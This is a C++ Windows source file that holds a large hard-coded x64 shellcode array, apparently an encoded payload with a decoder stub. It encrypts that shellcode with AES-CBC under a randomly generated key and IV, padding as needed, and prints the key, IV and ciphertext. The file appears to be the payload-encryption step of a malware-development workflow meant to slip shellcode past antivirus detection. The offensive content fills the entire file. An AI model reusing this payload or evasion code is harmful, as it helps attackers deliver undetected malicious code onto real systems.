#include <iostream>
#include <Windows.h>
#include "utils/headers/aes.h"
	

extern void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);
extern void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);


unsigned char shellcode[] =
"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x7b\x14\xa0\xdd\xa2\x85\xfa\xb3\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x87\x5c\x23"
"\x39\x52\x6d\x36\xb3\x7b\x14\xe1\x8c\xe3\xd5\xa8\xe2\x33"
"\x25\x72\xb8\xea\x0e\xa8\xd3\x33\x9f\xf2\xc5\xea\x0e\xa8"
"\x93\x2d\x59\x91\x14\xea\x8a\x4d\xf9\x31\x5c\x2b\xaf\xf2"
"\xcd\xcb\x73\xd7\x28\xc1\xa1\xa0\xa9\xda\xf2\xba\xdd\xad"
"\x9c\xa3\x44\x18\x5e\x29\x55\xf1\x95\x29\xd7\xda\x38\x39"
"\x28\xe8\xdc\x72\xe3\x7b\xcb\x63\x1f\xa2\xd2\x27\xf7\xfa"
"\xb3\x7b\x9f\x20\x55\xa2\x85\xfa\xfb\xfe\xd4\xd4\xba\xea"
"\x84\x2a\x38\x33\x0c\xf0\x99\x29\xc5\xda\xfa\x7a\xc4\x43"
"\x8b\xef\xb4\x33\xfb\x84\xdd\xe1\x56\x96\x0d\xb2\xb2\xad"
"\x5c\x91\x1d\xe3\x44\x33\xbe\xd7\x55\xa1\x1c\x9a\x65\x8f"
"\x42\x37\x17\xec\xf9\xaa\xc0\xc3\x62\x0e\xcc\xf8\x99\x29"
"\xc5\xde\xfa\x7a\xc4\xc6\x9c\x29\x89\xb2\xf7\xf0\x54\xbc"
"\x94\xa3\x55\xbb\x38\x7f\x9c\xe1\x85\xea\x84\x2a\xf2\x23"
"\x4a\xf9\x87\xe3\xdd\xbb\xea\x3a\x4e\xe8\x5e\x4e\xa5\xbb"
"\xe1\x84\xf4\xf8\x9c\xfb\xdf\xb2\x38\x69\xfd\xeb\x22\x5d"
"\x7a\xa7\xfa\xc5\x63\xd3\xef\xfd\xb6\xc8\xb3\x7b\x55\xf6"
"\x94\x2b\x63\xb2\x32\x97\xb4\xa1\xdd\xa2\xcc\x73\x56\x32"
"\xa8\xa2\xdd\xb3\xd9\x3a\x1b\x43\x72\xe1\x89\xeb\x0c\x1e"
"\xff\xf2\xe5\xe1\x67\xee\xf2\xdc\xb4\x84\xc1\xec\x54\x48"
"\xed\xfb\xb2\x7b\x14\xf9\x9c\x18\xac\x7a\xd8\x7b\xeb\x75"
"\xb7\xa8\xc4\xa4\xe3\x2b\x59\x91\x14\xef\xb4\x3a\xfb\x84"
"\xd4\xe8\x54\x60\xcd\x05\x73\x33\x9d\x61\x9c\x18\x6f\xf5"
"\x6c\x9b\xeb\x75\x95\x2b\x42\x90\xa3\x3a\x4c\xec\x54\x40"
"\xcd\x73\x4a\x3a\xae\x39\x78\xd6\xe4\x05\x66\xfe\xd4\xd4"
"\xd7\xeb\x7a\x34\xc6\x9e\xfc\x33\xdd\xa2\x85\xb2\x30\x97"
"\x04\xe8\x54\x40\xc8\xcb\x7a\x11\x10\xe1\x85\xea\x0c\x03"
"\xf2\xc1\x16\x79\x15\xfd\x7a\x2f\x30\x83\x14\xde\x88\xea"
"\x06\x3e\x93\x25\x9d\x56\xb7\xe2\xc4\xa3\xdb\x7b\x04\xa0"
"\xdd\xe3\xdd\xb2\x3a\x89\x5c\x91\x14\xe3\x3f\xa2\x17\x28"
"\xf1\x5f\x08\xea\x0c\x39\xfa\xf2\xd3\xed\xec\x6b\xcc\x73"
"\x43\x33\x9d\x7a\x95\x2b\x7c\xbb\x09\x79\xcd\x68\x82\x5d"
"\x50\x79\x4b\x7b\x69\x88\x85\xe3\xd2\xa3\xdb\x7b\x54\xa0"
"\xdd\xe3\xdd\x90\xb3\x21\x55\x1a\xd6\x8d\x8a\xca\x4c\xae"
"\x43\xf9\x9c\x18\xf0\x94\xfe\x1a\xeb\x75\x94\x5d\x4b\x13"
"\x8f\x84\xeb\x5f\x95\xa3\x46\xb2\x9a\xbd\x5c\x25\x2b\xd7"
"\x31\xbb\x4c\x9c\x4c\xca\xdd\xfb\xcc\x3d\x71\x8b\xa1\x02"
"\x8b\x5d\x50\xfa\xb3";




void GenerateRandomBytes(unsigned char* pByte, size_t sSize)
{
	for (int i = 0; i < sSize; i++) 
		pByte[i] = (unsigned char)rand() % 0xFF;
}
void PrintHex(const char* nameofarray, unsigned char* shellcode, size_t size)
{
	printf("unsigned char %s[] = {", nameofarray);

	for (int i = 0; i < size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < size - 1) {
			printf("0x%0.2X, ", shellcode[i]);
		}
		else {
			printf("0x%0.2X ", shellcode[i]);
		}
	}

	printf("};\n\n\n");
}


// Function that will take a buffer, and copy it to another buffer that is a multiple of 16 in size
BOOL PadBuffer(IN unsigned char* shellcode, IN size_t shellcode_size, OUT unsigned char** padded_buffer, OUT size_t* padded_buffer_size) {

	unsigned char*	PaddedBuffer = NULL;
	SIZE_T			PaddedSize   = NULL;

	// Calculate the nearest number that is multiple of 16 and saving it to PaddedSize
	PaddedSize = shellcode_size + 16 - (shellcode_size % 16);
	// Allocating buffer of size PaddedSize
	PaddedBuffer = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, PaddedSize);
	if (!PaddedBuffer) {
		return FALSE;
	}
	// Cleaning the allocated buffer
	ZeroMemory(PaddedBuffer, PaddedSize);
	// Copying old buffer to a new padded buffer
	memcpy(PaddedBuffer, shellcode, shellcode_size);
	// Saving results
	*padded_buffer		= PaddedBuffer;
	*padded_buffer_size = PaddedSize;

	return TRUE;
}

#define KEYSIZE				32
#define IVSIZE				16

int main()
{
	struct AES_ctx ctx;

	BYTE pKey[KEYSIZE];	
	BYTE pIv[IVSIZE];


	srand(time(NULL));						// The seed to generate the key
	GenerateRandomBytes(pKey, KEYSIZE);		// Generating the key bytes

	srand(time(NULL) ^ pKey[0]);			    // The seed to generate the iv (using the first byte from the key to add more spice)
	GenerateRandomBytes(pIv, IVSIZE);		// Generating the IV

	// Printing key and IV to the console
	PrintHex("pKey", pKey, KEYSIZE);
	PrintHex("pIv", pIv, IVSIZE);

	// Initilizing the Tiny-AES Library
	AES_init_ctx_iv(&ctx, pKey, pIv);


	// Initializing variables that will hold the new buffer base address and its size in case padding is required
	PBYTE	PaddedBuffer = NULL;
	SIZE_T	PAddedSize = NULL;

	// Padding buffer, if needed
	if (sizeof(shellcode) % 16 != 0) {
		PadBuffer(shellcode, sizeof(shellcode), &PaddedBuffer, &PAddedSize);
		// Encrypting the padded buffer instead
		AES_CBC_encrypt_buffer(&ctx, PaddedBuffer, PAddedSize);
		// Printing the encrypted buffer to the console
		PrintHex("CipherText", PaddedBuffer, PAddedSize);
	}
	else {
		// No padding is required, encrypt Data directly
		AES_CBC_encrypt_buffer(&ctx, shellcode, sizeof(shellcode));
		// Printing the encrypted buffer to the console
		PrintHex("CipherText", shellcode, sizeof(shellcode));
	}


	// Freeing PaddedBuffer, if needed
	if (PaddedBuffer != NULL) {
		HeapFree(GetProcessHeap(), 0, PaddedBuffer);
	}

	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	return 0;

}

